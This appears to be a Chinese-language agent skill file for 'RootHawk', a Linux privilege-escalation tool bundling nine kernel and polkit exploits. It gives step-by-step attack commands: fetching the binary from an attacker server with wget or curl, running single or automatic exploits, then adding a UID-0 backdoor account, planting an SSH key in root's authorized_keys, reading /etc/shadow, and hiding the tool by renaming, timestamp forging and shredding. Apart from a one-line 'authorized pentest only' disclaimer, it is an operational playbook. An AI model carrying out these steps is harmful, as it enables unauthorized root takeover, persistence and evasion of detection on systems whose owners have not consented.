---
name: roothawk-lpe
description: RootHawk Linux本地提权工具操作技能——集成9个内核级CVE漏洞利用模块，覆盖PwnKit/DirtyPipe/Polkit及6个2026年最新CVE。支持单CVE执行和全量自动攻击(-any模式)。触发词：Linux提权、ROOT提权、本地提权、内核漏洞提权、LPE、DirtyPipe、PwnKit、sudo提权、kernel exploit。
metadata:
  short-description: Linux本地提权自动化工具(RootHawk)
  tools: RootHawk,gcc,cc
  cves: CVE-2021-4034,CVE-2021-3560,CVE-2022-0847,CVE-2026-31431,CVE-2026-43284,CVE-2026-43494,CVE-2026-43503,CVE-2026-46300,CVE-2026-46331
  categories: privilege-escalation,linux,kernel-exploit,lpe,post-exploitation
  risk-level: critical
version: "2.0.0"
author: RootHawk / CyberStrikeAI
---

# RootHawk — Linux 本地提权自动化工具

## 工具路径

```bash
BINARY="/root/CyberStrikeAI-1.6.49/tools/roothawk/roothawk"
SOURCE="/root/CyberStrikeAI-1.6.49/tools/roothawk/source/"
```

## 基本信息

- **版本**: v2.0.0
- **语言**: Go (主程序) + C (漏洞利用模块)
- **架构**: amd64 静态编译 (单文件)
- **集成 CVE**: 9 个

## 第一步：环境侦查

```bash
# 上传前先确认目标环境
uname -a                    # 内核版本
cat /etc/os-release         # 发行版
arch                        # CPU 架构 (x86_64/amd64)
gcc --version               # C 编译器是否安装

# 确认 SUID/GUID 文件
find / -perm -4000 -type f 2>/dev/null

# 确认当前用户 sudo 权限
sudo -l 2>/dev/null
id
```

## 第二步：上传工具

```bash
# 方法1: wget
wget http://YOUR_SERVER/roothawk -O /tmp/roothawk && chmod +x /tmp/roothawk

# 方法2: curl
curl -o /tmp/roothawk http://YOUR_SERVER/roothawk && chmod +x /tmp/roothawk

# 方法3: base64 编码传输
# 在攻击机: base64 -w0 roothawk > roothawk.b64
# 在目标机: echo "BASE64DATA" | base64 -d > /tmp/roothawk && chmod +x /tmp/roothawk
```

## 第三步：列出可用漏洞

```bash
/tmp/roothawk -list
```

输出所有已集成的 CVE 及别名:

| CVE | 别名 | 说明 | 影响内核 |
|-----|------|------|---------|
| CVE-2021-4034 | PwnKit | pkexec 本地提权 | 2009-May 2021 的所有内核 |
| CVE-2021-3560 | Polkit | D-Bus 授权绕过 | 需 polkit 0.105+ |
| CVE-2022-0847 | DirtyPipe | 管道页缓存覆写 | 5.8 - 5.16.11/5.15.25/5.10.102 |
| CVE-2026-31431 | - | su 文件替换提权 | 需 root suid |
| CVE-2026-43284 | - | PTY 竞争条件 | Ubuntu 特定 |
| CVE-2026-43494 | - | 内核模块漏洞 | - |
| CVE-2026-43503 | - | 内核漏洞 | - |
| CVE-2026-46300 | - | 内核漏洞 | - |
| CVE-2026-46331 | - | 内核漏洞 | - |

## 第四步：单 CVE 执行

```bash
# PwnKit (最通用)
/tmp/roothawk -e CVE-2021-4034

# PwnKit 指定 pkexec 路径
/tmp/roothawk -e CVE-2021-4034 -pk /usr/local/bin/pkexec

# DirtyPipe (内核 5.8+)
/tmp/roothawk -e CVE-2022-0847

# Polkit
/tmp/roothawk -e CVE-2021-3560

# CVE-2026-31431 (备份 + 提权)
/tmp/roothawk -e CVE-2026-31431 -backup /tmp/su.bak

# CVE-2026-31431 (执行命令而非shell)
/tmp/roothawk -e CVE-2026-31431 -exec "/usr/bin/id"

# CVE-2026-43284 (详细日志)
/tmp/roothawk -e CVE-2026-43284 -v

# 详细日志模式
/tmp/roothawk -e CVE-2022-0847 -v
```

## 第五步：全量自动攻击

```bash
# 按列表顺序尝试所有CVE，第一个成功即停止
/tmp/roothawk -any

# 带详细日志
/tmp/roothawk -any -v
```

## CVE 选择策略

```
目标确认 → uname -a → 判断内核版本 → 选择CVE

┌─────────────────────────────────────────────────────────┐
│ 内核 < 5.8                                               │
│   → CVE-2021-4034 (PwnKit, 最稳定)                       │
│   → CVE-2021-3560 (Polkit, 需polkit包)                   │
│                                                          │
│ 内核 5.8 - 5.16                                          │
│   → CVE-2022-0847 (DirtyPipe, 无条件限制)                 │
│   → CVE-2021-4034 (PwnKit, 备选)                         │
│                                                          │
│ 任意内核 (2026年新CVE)                                    │
│   → CVE-2026-31431 (su替换, 影响面最大)                    │
│   → CVE-2026-43284 (Ubuntu专项)                           │
│   → CVE-2026-43494 / 43503 / 46300 / 46331               │
│                                                          │
│ 不确定时                                                   │
│   → /tmp/roothawk -any    (全量自动)                      │
└─────────────────────────────────────────────────────────┘
```

## 各 CVE 详细操作

### CVE-2021-4034 (PwnKit)

```bash
# 利用条件: pkexec 文件存在 (通常 /usr/bin/pkexec)
# 影响面: 2009年5月以来的所有主流Linux发行版
# 风险: 极低 - 不修改系统文件

/tmp/roothawk -e CVE-2021-4034

# 提权成功后自动进入 root shell
# 利用原理: pkexec 的 out-of-bounds 写 → 环境变量注入 → 加载恶意 .so
```

### CVE-2022-0847 (DirtyPipe)

```bash
# 利用条件: 内核 5.8 ~ 5.16.x (需该范围内)
# 风险: 低 - 修改 /etc/passwd(root密码→"roothawk"), 退出shell后自动恢复

/tmp/roothawk -e CVE-2022-0847

# 利用原理: splice() 后 pipe buffer 未初始化 → 直接覆写页缓存中的 /etc/passwd
# 退出shell后自动恢复原始 /etc/passwd
# ⚠️ 切勿在提权shell中 exit 太快，保持shell执行完操作
```

### CVE-2026-31431

```bash
# 利用条件: 需要 root suid 权限 /bin/su
# 风险: 中 - 备份su二进制，成功后替换为目标程序

/tmp/roothawk -e CVE-2026-31431 -backup /tmp/su.bak
/tmp/roothawk -e CVE-2026-31431 -exec /usr/bin/id
```

### CVE-2026-43284

```bash
# 利用条件: Ubuntu系统, 需要 gcc
# 风险: 中 - 可能污染页缓存 (需事后 root 执行 echo 3 > /proc/sys/vm/drop_caches)

/tmp/roothawk -e CVE-2026-43284 -v
```

## 提权后操作

```bash
# 1. 确认提权
id && whoami

# 2. 添加持久化账号
useradd -o -u 0 -g 0 -M -s /bin/bash backdoor_user
echo 'backdoor_user:P@ssw0rd123' | chpasswd

# 3. SSH 密钥后门
echo "ssh-rsa AAAAB3NzaC1yc2E..." >> /root/.ssh/authorized_keys

# 4. 读取敏感文件
cat /etc/shadow
cat /root/.bash_history

# 5. 清理痕迹
# DirtyPipe 会自动恢复 /etc/passwd 
# PwnKit 不会留下痕迹
# CVE-2026-43284 需要 drop_caches
echo 3 > /proc/sys/vm/drop_caches
```

## 免杀与隐蔽

```bash
# 1. 重命名二进制
mv /tmp/roothawk /tmp/updatedb

# 2. 放在隐蔽目录
mkdir -p /dev/shm/.hidden && mv /tmp/roothawk /dev/shm/.hidden/syslogd

# 3. 修改时间戳
touch -r /bin/ls /tmp/syslogd

# 4. 执行后删除
/tmp/syslogd -e CVE-2022-0847; shred -zu /tmp/syslogd
```

## 编译源码 (如需自定义)

```bash
cd /root/CyberStrikeAI-1.6.49/tools/roothawk/source

# 编译主程序
go build -ldflags="-s -w" -o roothawk roothawk.go

# 交叉编译为不同架构
GOOS=linux GOARCH=arm64 go build -ldflags="-s -w" -o roothawk-arm64 roothawk.go

# 静态编译 (去掉glibc依赖)
CGO_ENABLED=0 go build -ldflags="-s -w" -o roothawk-static roothawk.go

# 修改 payload
# 编辑 pkg/payloads/payloads.go 修改 Default Payload
# 编辑 pkg/shell/password.go 修改凭证逻辑
```

## 故障排查

```bash
# C 编译失败 → 安装 gcc
apt-get install -y gcc        # Debian/Ubuntu
yum install -y gcc            # CentOS/RHEL
# 或使用 apk/pacman 等

# PwnKit 失败 → 检查 pkexec 路径
which pkexec
/tmp/roothawk -e CVE-2021-4034 -pk /usr/local/bin/pkexec

# DirtyPipe 失败 → 确认内核版本
uname -r  # 应为 5.8~5.16 之间

# CVE-2026-43284 页缓存污染 → 重启或 drop caches
echo 3 > /proc/sys/vm/drop_caches
reboot
```

## 安全注意事项

- ⚠️ 仅用于授权渗透测试
- ⚠️ DirtyPipe 会临时修改 /etc/passwd (退出shell后自动恢复)
- ⚠️ CVE-2026-43284 可能污染页缓存 (需root后 drop_caches)
- ⚠️ 内核漏洞利用可能导致系统不稳定或崩溃
- ⚠️ 部分 CVE 需要 gcc 编译器在目标机上
- ⚠️ Polkit 模块 (CVE-2021-3560) 可能留下 DBus 日志
